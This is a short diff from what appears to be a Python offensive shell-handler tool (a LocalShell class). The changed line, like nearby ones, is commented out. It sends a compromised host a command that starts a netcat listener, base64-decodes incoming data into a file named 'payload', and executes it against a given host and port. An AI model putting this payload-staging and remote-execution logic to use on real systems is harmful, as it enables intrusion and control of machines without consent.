@@ -165,7 +165,7 @@ class LocalShell(cmd.Cmd):
             logging.info(f"Sending payload..")
             # sock.client_socket.send(b"touch payload\n")
             # sock.client_socket.send(b"chmod +x payload\n")
-            # sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -l 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
+            # sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
             sock.server_socket.close()
             sock.client_socket.close()
             # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
